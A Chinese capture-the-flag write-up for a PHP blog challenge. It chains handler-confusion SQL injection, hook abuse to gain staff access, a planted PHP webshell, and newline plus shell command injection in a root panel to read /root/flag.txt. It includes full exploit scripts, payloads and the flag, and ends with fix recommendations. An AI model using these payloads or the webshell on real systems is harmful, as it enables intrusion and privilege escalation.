# 强网杯 Web - SimpleBlog Writeup

## 一、题目信息

- 题目：SimpleBlog（一个用 PHP 写的极简博客）
- 分值：100
- 目标：`flag` 位于 `/root/flag.txt`
- 入口：`https://eci-2zebebgo1znnrjnst0t1.cloudeci1.ichunqiu.com`
- 附件：`blog-src_7827b45b9013e92261f86a1150f32462.zip`

## 二、Flag

```
flag{29647d78-9ecd-47de-96d0-b56e0243ac39}
```

## 三、漏洞链概览

本题一共三层，逐层提权：

1. **bulk 路由错位（handler confusion）**：构造一条 `parse_url()` 失败的 route，使 `$matched` 与 `$checked` 下标错位，借用 `/api/bulk` 的 handler 执行嵌套 bulk；内层再次错位，把 `/api/stats/summary` 的 `omit` 参数以**原始字符串**交给 `/api/articles` 的 `exec_articles_list`，进入 `owner NOT IN ($ids)` 的字符串拼接，形成 UNION 注入。
2. **hooks 提权**：用 UNION 伪造 `entries` 行，触发 `pending_changeset` 与 `api_reload` 两个 hook。前者以 staff 身份调用 `changeset_publish()` 设置 `$GLOBALS["PUBLISH_AS"]`，后者在 `HOOK_RUNNING=1` 时重放当前 bulk 的 ops，使 `/api/users` 以 staff 身份执行，创建我们自己的 staff 账号；登录后通过 `manage.php?action=skin-editor` 写入 PHP webshell，拿到 www-data RCE。
3. **hpxd 提权到 root**：容器内以 root 运行的 Hosting Panel `hpxd`（`/usr/local/libexec/smrtmond.pl`）监听 `127.0.0.1:9443/9444/9446/9447`。在非用户端口 9446/9447 上，`/ops/code` 未鉴权直接泄露 hpxd 源码；源码中的 Basic 认证分支未清洗换行符，且当 cookie 不带 scramble 时会以明文写入 vault。通过换行注入 `master_flag=1`、`otp_done=1`、`sudo_until` 伪造 master 身份，最后利用 `/hx_<zone>/files/list?path=` 把用户输入拼进 `/bin/sh -c "ls -la $dir"`，以 root 执行任意命令，读取 `/root/flag.txt`。

---

## 四、第一层：bulk 错位 + omit 注入

### 4.1 源码关键点

`engine.php` 中 `bulk_engine()` 在执行前会先对每个 op 做 `route_bind` + `op_check`：

```php
foreach ($ops as $op) {
    if (isset($op["err"])) { $has_err = true; $checked[] = $op; continue; }
    $bind = route_bind($op);
    $matched[] = $bind;              // 只有 build 成功的 op 才追加
    ...
    $checked[] = ...;                // 每个 op 都追加
}
...
foreach ($ops as $i => $op) {
    ...
    $bind = $matched[$i] ?? null;    // 下标错位
    $verdict = $checked[$i];
    $results[] = op_respond($verdict["op"], $bind["handler"]);
}
```

只要让第 0 个 op 在 `build_op()` 阶段失败（`parse_url("//") === false`），`$matched` 就會整体左移，第 1 个 op 的参数会套用到第 2 个 op 的 handler 上。

同时 `posts_lookup()` 对 `owner_not_in` 只对**数组**做 `absint`：

```php
if (!empty($spec["owner_not_in"])) {
    if (is_array($spec["owner_not_in"])) {
        $spec["owner_not_in"] = array_unique(array_map("absint", ...));
        sort($spec["owner_not_in"]);
    }
    $ids = implode(",", (array)$spec["owner_not_in"]);
    $conds[] = "owner NOT IN ($ids)";   // 字符串时直接拼接
}
```

正常请求里 `omit` 被 `op_check()` 按 `id_list` 转成整数数组；但经过错位后，参数是按 `/api/stats/summary` 的 args 检查的（没有 `omit`），`omit` 保持原始字符串，最终进入上面的 SQL 拼接，SQL 注入成立。

### 4.2 外层错位：拿到嵌套 bulk

发送到 `POST /bulk.php`：

```json
{"ops":[
  {"route":"//","verb":"POST"},
  {"route":"/api/login","verb":"POST","data":{
      "login":"a","pass":"b",
      "ops":[ /* 内层 ops */ ]
  }},
  {"route":"/api/bulk","verb":"POST"}
]}
```

- op0 `//`：`parse_url` 失败，`build_op` 返回 `route_unparseable`。
- op1 `/api/login`：正常 bind，`checked[1]` 是它的参数。
- op2 `/api/bulk`：`matched[0]` 才是它的 bind，`matched[1]` 指向它。
- 结果循环 i=1 时：`$bind = $matched[1] = bind(/api/bulk)`，即用 `/api/bulk` 的 handler 执行 op1 的参数，`exec_bulk()` 读取 `params["ops"]`，进入嵌套 bulk。

### 4.3 内层错位：omit 原始字符串进入 SQL

内层 ops：

```json
[
  {"route":"//","verb":"GET"},
  {"route":"/api/stats/summary","verb":"GET","data":{
      "omit":"1) UNION SELECT 999,@@version,'a','b','c','d','zz','zz',0,0-- -"
  }},
  {"route":"/api/articles","verb":"GET"}
]
```

同样错位后，i=1 时执行 `/api/articles` 的 handler `exec_articles_list()`，参数来自 stats 那个 op，`omit` 是原始字符串，最终 SQL 形如：

```sql
... WHERE status='published' AND owner NOT IN (1) UNION SELECT 999,@@version,... -- -)
```

`entries` 列表的 10 个字段固定为：

```
id, title, slug, owner, excerpt, created_at, status, kind, parent, snap_stale
```

UNION 必须补齐 10 列。先用它确认注入：

```
999,@@version,'a','b','c','d','zz','zz',0,0
```

返回 `10.11.14-MariaDB-0ubuntu0.24.04.1`，注入确认。

### 4.4 拖 staff 账号

```
999,login,'x',secret,'x','x','x','x',0,0 FROM staff_accounts LIMIT 1
```

字段映射到返回 JSON 的 `title` / `owner`，即可拿到 staff 的真实登录名与 bcrypt 哈希（登录名不是 `staff`，而是 10 位十六进制，如 `1520ebf75e`）。

---

## 五、第二层：hooks 提权拿 staff + webshell

### 5.1 伪造 entry 行触发 hook

`snapshot_write()` 会按 `status . "_" . kind` 触发 hook：

```php
hooks_fire($full["status"] . "_" . $full["kind"], $full);
```

于是伪造两行 entry：

- id=998：`status='pending', kind='changeset'` → `pending_changeset` → `hook_changeset_promote()`；
- id=999：`status='api', kind='reload'` → `api_reload` → `hook_api_reload()`。

`hook_changeset_promote()` 用 entry 的 `title` 作为 setting_key、`content` 作为 value、`owner` 作为 author_login 插入 `site_changesets`，随后 `changeset_publish()` 检查 `login_is_staff(author_login)`，通过后设置：

```php
$GLOBALS["PUBLISH_AS"] = $cs["author_login"];
```

`hook_api_reload()` 在 `HOOK_RUNNING=1` 时重放 `$GLOBALS["CUR_OPS"]`，期间 `exec_articles_list()` 末尾的 `unset($GLOBALS["PUBLISH_AS"])` 不会执行，因此后续 op 会以 staff 身份通过 `staff_session_valid()`。

注意顺序：`ORDER BY created_at DESC`，要让 998（changeset）先于 999（reload）被处理：

```
998,'skin','x','1520ebf75e','x','2099-01-01 00:00:01','pending','changeset',0,1
UNION SELECT 999,'y','y','y','y','2099-01-01 00:00:00','api','reload',0,1
```

并在内层 ops 的 `/api/articles` 之后追加：

```json
{"route":"/api/users","verb":"POST","data":{"login":"pwner1","pass":"Password123!"}}
```

`api_reload` 重放内层 ops 时，这个 `/api/users` 就带着 `PUBLISH_AS` 执行，成功创建 staff 账号。

### 5.2 登录 + 写 webshell

```bash
curl -s -c cj.txt -X POST "$BASE/feed.php?route=/api/login" \
     -d 'login=pwner1&pass=Password123!'

curl -s -b cj.txt -X POST "$BASE/manage.php?action=skin-editor" \
     --data-urlencode 'name=shellx' \
     --data-urlencode 'code=<?php echo "OK\n"; system($_GET["c"]); ?>'
```

访问：

```
/uploads/skins/shellx.php?c=id
```

得到 `uid=33(www-data)`，www-data RCE 完成。

---

## 六、第三层：hpxd 提权到 root

### 6.1 发现 hpxd

www-data 下枚举：

```
ps auxww
ss -lntp
```

发现 root 进程 `/usr/bin/perl /usr/local/libexec/smrtmond.pl`，以及 `127.0.0.1:9443/9444/9446/9447`、`/opt/hpxd`、`/var/log/hpxd`。`/var/log/supervisor/smrtmond.err` 中直接写着：

```
hpxd: listening on 9443 9444 9446 9447
```

端口行为：

- 9443/9444：用户端口，任何路径都返回登录页；
- 9446/9447：非用户端口，`/ops/code` **无鉴权**，直接返回 hpxd 源码（`/opt/hpxd/hpxd.pl`）。

### 6.2 hpxd 认证逻辑（源码关键点）

```perl
sub vault_is_master {
    my ($s) = @_;
    return 0 unless defined $s->{master_flag} && $s->{master_flag} eq "1";
    return 0 unless defined $s->{otp_done} && $s->{otp_done} eq "1";
    return 0 unless defined $s->{login} && $s->{login} eq "root";
    if (defined $s->{sudo_until} && $s->{sudo_until} =~ /^\d+$/ && $s->{sudo_until} > time()) {
        return 1;
    }
    my $h = master_digest();
    return ($h ne "" && defined $s->{secret} && md5_hex($s->{secret}) eq $h) ? 1 : 0;
}
```

会话状态存在 `%VAULT` 的 `raw` 中，格式是每行 `key=value`。Basic 认证分支：

```perl
my ($u, $p) = split(/:/, $decoded, 2);
# 注意：没有 sess_value_clean($u/$p)
vault_put($token, "login",  cloak_store($token, $u, $has_cookie, $cookie_scramble));
vault_put($token, "secret", cloak_store($token, $p, $has_cookie, $cookie_scramble));
```

`cloak_store()` 在 cookie 不带 scramble 时 key 为空，直接**明文存储**；而 Basic 分支的密码没有过滤换行符和 `=`，因此可以注入任意 vault 键值行。

另外，`vault_fetch()` 带进程级缓存，写入后不会立即失效；`/hx_<错误zone>/...` 会触发 `vault_rescan()` 清缓存。`/` 在 Basic 写入后会 307 到 `/<zone>/`，可借此拿到 zone。

### 6.3 利用步骤

1）取一个 token（先建立会话）：

```bash
curl -s -i http://127.0.0.1:9446/ops/ping
# Set-Cookie: hpx_id=hx_xxxxxxxxxx,<scramble>
```

2）构造 Basic 凭据，密码中包含换行注入：

```
明文: root:x\nmaster_flag=1\notp_done=1\nsudo_until=9999999999
```

用**不带 scramble** 的 cookie 发送（`Cookie: hpx_id=hx_xxxxxxxxxx`），触发 307，`Location` 泄露 zone：

```bash
B64=$(printf 'root:x\nmaster_flag=1\notp_done=1\nsudo_until=9999999999' | base64 -w0)
curl -s -i -H "Cookie: hpx_id=$TOK" -H "Authorization: Basic $B64" http://127.0.0.1:9446/
# 307 Location: /hx_<zone>/
```

3）访问错误 zone 触发 `vault_rescan()`，让注入后的状态生效：

```bash
curl -s -H "Cookie: hpx_id=$TOK" http://127.0.0.1:9446/hx_0000000000/x
# 401 Pass rejected - resync pending
```

4）访问 `/hx_<zone>/files/list?path=`，命令注入：

```bash
curl -s -H "Cookie: hpx_id=$TOK" \
  "http://127.0.0.1:9446/$ZONE/files/list?path=/tmp%3Bid%3Bcat%20/root/flag.txt"
```

源码中：

```perl
my $dir = $qs{path} // "/home/siteuser";
$dir =~ s/[\x00-\x09\x0b-\x1f\x7f]+/ /g;
open my $fh, "-|", "timeout", "-k", "5", $EXEC_SECONDS, "/bin/sh", "-c", "ls -la " . $dir;
```

只过滤了部分控制字符，`;`、`|`、`$()`、空格都保留，且 `timeout`/`sh` 以 root 执行，直接 root 命令执行。

输出：

```
uid=0(root) gid=0(root) groups=0(root)
flag{29647d78-9ecd-47de-96d0-b56e0243ac39}
```

`/root/flag.txt` 权限 `-rw------- root root`，至此读取成功。

---

## 七、完整利用脚本

### 7.1 SQL 注入 / hooks 提权（Python）

```python
import json, subprocess, sys

T = "https://eci-2zebebgo1znnrjnst0t1.cloudeci1.ichunqiu.com"

def inj(sel, extra_ops=None, count=50):
    payload = "1) UNION SELECT " + sel + "-- -"
    inner = [
        {"route": "//", "verb": "GET"},
        {"route": "/api/stats/summary", "verb": "GET", "data": {"omit": payload}},
        {"route": "/api/articles", "verb": "GET", "data": {"count": str(count)}},
    ]
    if extra_ops:
        inner.extend(extra_ops)
    outer = [
        {"route": "//", "verb": "POST"},
        {"route": "/api/login", "verb": "POST", "data": {"login": "a", "pass": "b", "ops": inner}},
        {"route": "/api/bulk", "verb": "POST"},
    ]
    out = subprocess.run(
        ["curl", "-sk", "-m", "30", "-X", "POST", T + "/bulk.php",
         "-H", "Content-Type: application/json", "--data", json.dumps({"ops": outer})],
        capture_output=True, text=True).stdout
    d = json.loads(out)
    rows = []
    for it in d["results"][1]:
        if isinstance(it, dict) and "articles" in it:
            rows = it["articles"]
    return rows
```

拖 staff 账号：

```python
rows = inj("999,login,'x',secret,'x','x','x','x',0,0 FROM staff_accounts LIMIT 1")
```

伪造两行 + 建号：

```python
sel = ("998,'skin','x','1520ebf75e','x','2099-01-01 00:00:01','pending','changeset',0,1 "
       "UNION SELECT 999,'y','y','y','y','2099-01-01 00:00:00','api','reload',0,1")
inj("1) AND 1=0 UNION SELECT " + sel, extra_ops=[
    {"route": "/api/users", "verb": "POST",
     "data": {"login": "pwner1", "pass": "Password123!"}}
])
```

（上面 sel 里的 `1)` 是配合 payload 前缀，实际使用时保持 `1) UNION SELECT ...` 的形态，按脚本 `inj()` 拼装即可。）

### 7.2 webshell

```bash
curl -s -c cj.txt -X POST "$BASE/feed.php?route=/api/login" \
     -d 'login=pwner1&pass=Password123!'
curl -s -b cj.txt -X POST "$BASE/manage.php?action=skin-editor" \
     --data-urlencode 'name=shellx' \
     --data-urlencode 'code=<?php echo "OK\n"; system($_GET["c"]); ?>'
curl -s "$BASE/uploads/skins/shellx.php?c=id;cat+/root/flag.txt"
```

### 7.3 hpxd root（在 webshell 里本地执行）

```bash
PORT=9446
B64=$(printf 'root:x\nmaster_flag=1\notp_done=1\nsudo_until=9999999999' | base64 -w0)

CK=$(curl -s -i http://127.0.0.1:$PORT/ops/ping | tr -d '\r' \
     | grep -i '^Set-Cookie:' | sed 's/.*hpx_id=\([^;]*\).*/\1/')
TOK=${CK%%,*}

LOC=$(curl -s -i -H "Cookie: hpx_id=$TOK" -H "Authorization: Basic $B64" \
      http://127.0.0.1:$PORT/ | tr -d '\r' | grep -i '^Location:')
ZONE=$(echo "$LOC" | sed 's#.*/\(hx_[0-9]*\)/.*#\1#')

# 触发 vault_rescan
curl -s -H "Cookie: hpx_id=$TOK" http://127.0.0.1:$PORT/hx_0000000000/x >/dev/null

# root 命令执行
curl -s -H "Cookie: hpx_id=$TOK" \
  "http://127.0.0.1:$PORT/$ZONE/files/list?path=/tmp%3Bid%3Bcat%20/root/flag.txt"
```

输出：

```
uid=0(root) gid=0(root) groups=0(root)
flag{29647d78-9ecd-47de-96d0-b56e0243ac39}
```

---

## 八、修复建议

1. `bulk_engine()` 中 `$matched` 与 `$checked` 必须使用同一套索引/占位，禁止因 build 错误导致 handler 与参数错位；嵌套 bulk 应显式鉴权并限制能力。
2. `posts_lookup()` 的 `owner_not_in` 无论数组还是字符串都必须强制整数化，或统一走 PDO 绑定；不能依赖调用方类型。
3. `changeset`/`hook` 机制不应信任 entry 的 `status/kind/owner`；`PUBLISH_AS` 属于进程级提权状态，必须在每个操作前显式校验来源，不能跨 hook 重放继承。
4. hpxd：
   - 所有端口统一鉴权，`/ops/code` 不应向非管理端口暴露源码；
   - Basic 认证与表单认证都必须对凭据做与 `sess_value_clean` 等价的清洗；
   - 会话缓存写入后必须失效，不能依赖 `vault_rescan` 的隐式行为；
   - `files/list` 禁止用 `/bin/sh -c` 拼接路径，改用 `open "-|", "ls", "-la", $dir` 的列表形式，并对路径做白名单校验；
   - hpxd 不应以 root 运行，至少降权到专用低权限用户，并限制其能访问的目录。
